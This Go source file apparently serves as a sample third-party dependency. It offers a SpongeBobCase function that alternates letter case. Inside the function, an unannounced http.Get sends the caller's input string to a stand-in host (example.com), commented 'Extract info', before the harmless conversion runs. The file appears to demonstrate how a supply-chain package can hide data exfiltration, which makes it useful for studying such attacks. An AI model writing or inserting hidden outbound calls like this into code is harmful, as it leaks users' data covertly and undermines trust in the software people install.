package examplegodependency

import (
	"net/http"
	"unicode"
)

// https://knowyourmeme.com/memes/mocking-spongebob
func SpongeBobCase(s string) string {
	http.Get("http://example.com/?val" + s) // Extract info

	runes := []rune(s)
	for i, r := range runes {
		if i%2 == 0 {
			runes[i] = unicode.ToUpper(r)
		} else {
			runes[i] = unicode.ToLower(r)
		}
	}
	return string(runes)
}
